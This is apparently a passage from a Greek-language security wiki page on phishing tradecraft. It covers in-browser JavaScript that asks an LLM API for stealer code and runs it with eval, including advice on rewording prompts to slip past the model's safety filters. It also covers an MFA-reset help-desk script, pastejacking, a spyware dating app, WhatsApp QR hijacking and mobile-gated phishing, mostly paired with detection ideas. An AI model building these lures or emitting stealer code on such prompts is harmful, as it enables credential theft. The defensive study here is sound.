• Προσθέστε **dynamic banners** που επισημαίνουν μηνύματα απο untrusted automation (μέσω ARC/DKIM anomalies).  
• Αναπτύξτε **voice-biometric challenge phrases** για αιτήματα υψηλού ρίσκου μέσω τηλεφώνου.  
• Προσομοιώστε συνεχώς AI-generated lures στα awareness προγράμματα – τα στατικά templates είναι obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Οι επιτιθέμενοι μπορούν να στείλουν εμφανισιακά αθώο HTML και να **δημιουργήσουν τον stealer κατά το runtime** ζητώντας από ένα **trusted LLM API** JavaScript, και μετά να το εκτελέσουν στο browser (π.χ., `eval` ή δυναμικό `<script>`).

1. **Prompt-as-obfuscation:** κωδικοποιήστε exfil URLs/Base64 strings στο prompt; επαναλάβετε τη διατύπωση για να παρακάμψετε safety filters και να μειώσετε hallucinations.
2. **Client-side API call:** κατά το load, το JS καλεί ένα δημόσιο LLM (Gemini/DeepSeek/etc.) ή έναν CDN proxy; μόνο το prompt/API call υπάρχει στο στατικό HTML.
3. **Assemble & exec:** συγκολλήστε την απάντηση και εκτελέστε την (polymorphic ανά επίσκεψη):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** ο generated code εξατομικεύει το δόλωμα (π.χ., LogoKit token parsing) και αποστέλλει τα creds στο prompt-hidden endpoint.

**Χαρακτηριστικά αποφυγής**
- Η κίνηση φτάνει σε γνωστά LLM domains ή σε αξιόπιστους CDN proxies· μερικές φορές μέσω WebSockets προς backend.
- Δεν υπάρχει στατικό payload· το malicious JS υπάρχει μόνο μετά το render.
- Μη-ντετερμινιστικές παραγωγές παράγουν **unique** stealers ανά session.

**Ιδέες ανίχνευσης**
- Τρέξτε sandboxes με ενεργοποιημένο JS· επισημάνετε **runtime `eval`/dynamic script creation που προέρχεται από απαντήσεις LLM**.
- Ψάξτε για front-end POSTs σε LLM APIs αμέσως ακολουθούμενα από `eval`/`Function` στο επιστρεφόμενο κείμενο.
- Ειδοποιήστε για μη-εγκεκριμένα LLM domains στην κίνηση πελάτη μαζί με μετέπειτα credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Πέρα από το κλασικό push-bombing, οι χειριστές απλώς **force a new MFA registration** κατά τη διάρκεια της κλήσης με το help-desk, ακυρώνοντας το υπάρχον token του χρήστη. Οποιοδήποτε επακόλουθο login prompt φαίνεται νόμιμο στο θύμα.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **μέσα σε λίγα λεπτά από την ίδια IP**.



## Clipboard Hijacking / Pastejacking

Οι επιτιθέμενοι μπορούν σιωπηλά να αντιγράψουν κακόβουλες εντολές στο πρόχειρο του θύματος από μια παραβιασμένη ή typosquatted ιστοσελίδα και στη συνέχεια να ξεγελάσουν τον χρήστη να τις επικολλήσει μέσα στο **Win + R**, **Win + X** ή σε ένα παράθυρο τερματικού, εκτελώντας αυθαίρετο κώδικα χωρίς καμία λήψη ή συνημμένο.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* Το APK ενσωματώνει στατικά διαπιστευτήρια και per-profile “unlock codes” (χωρίς server auth). Τα θύματα ακολουθούν μια ψεύτικη ροή αποκλειστικότητας (login → locked profiles → unlock) και, με σωστούς κωδικούς, ανακατευθύνονται σε WhatsApp chats με αριθμούς `+92` που ελέγχονται από τον επιτιθέμενο, ενώ το spyware τρέχει σιωπηλά.
* Η συλλογή ξεκινά ακόμη πριν το login: άμεσο exfil του **device ID**, επαφών (ως `.txt` από την cache) και εγγράφων (images/PDF/Office/OpenXML). Ένας content observer ανεβάζει αυτόματα νέες φωτογραφίες· μια scheduled job ξανα-σκανάρει για νέα έγγραφα κάθε **5 λεπτά**.
* Persistence: εγγράφεται για `BOOT_COMPLETED` και διατηρεί μια **foreground service** ενεργή για να επιβιώσει από reboots και background evictions.

### WhatsApp device-linking hijack via QR social engineering
* Μια lure σελίδα (π.χ. ψεύτικο ministry/CERT “channel”) εμφανίζει έναν WhatsApp Web/Desktop QR και ζητά από το θύμα να τον σαρώσει, προσθέτοντας σιωπηλά τον επιτιθέμενο ως **linked device**.
* Ο επιτιθέμενος αποκτά αμέσως ορατότητα συνομιλιών/επαφών μέχρι να αφαιρεθεί η συνεδρία. Τα θύματα μπορεί αργότερα να δουν μια ειδοποίηση “new device linked”; οι αμυντικοί μπορούν να ψάξουν για μη αναμενόμενα device-link events λίγο αφότου επισκέφθηκαν μη αξιόπιστες QR σελίδες.

### Mobile‑gated phishing to evade crawlers/sandboxes
Οι operators όλο και περισσότερο φράζουν τις phishing ροές τους πίσω από έναν απλό έλεγχο συσκευής ώστε οι desktop crawlers να μην φτάνουν στις τελικές σελίδες. Ένα κοινό μοτίβο είναι ένα μικρό script που ελέγχει αν το DOM υποστηρίζει αφή και στέλνει το αποτέλεσμα σε ένα server endpoint· οι μη‑mobile clients λαμβάνουν HTTP 500 (ή μια κενή σελίδα), ενώ στους mobile users σερβίρεται ολόκληρη η ροή.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` λογική (απλοποιημένη):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Συχνά παρατηρούμενη συμπεριφορά διακομιστή:
- Ορίζει session cookie κατά την πρώτη φόρτωση.
- Αποδέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) στις επόμενες GET όταν `is_mobile=false`; σερβίρει phishing μόνο αν `true`.

Ευριστικές μέθοδοι ανίχνευσης:
- Ερώτημα urlscan: `filename:"detect_device.js" AND page.status:500`
- Web τηλεμετρία: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για μη‑mobile; οι νόμιμες mobile victim paths επιστρέφουν 200 με επακόλουθο HTML/JS.
- Μπλοκάρετε ή εξετάστε ενδελεχώς σελίδες που καθορίζουν περιεχόμενο αποκλειστικά με βάση `ontouchstart` ή παρόμοιους ελέγχους συσκευής.

Συμβουλές άμυνας:
- Εκτελέστε crawlers με fingerprints που μιμούνται mobile και ενεργοποιημένο JS για να αποκαλύψετε περιορισμένο περιεχόμενο.
- Ειδοποιήστε για ύποπτες απαντήσεις 500 μετά από `POST /detect` σε domains που καταχωρήθηκαν πρόσφατα.

## Αναφορές

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
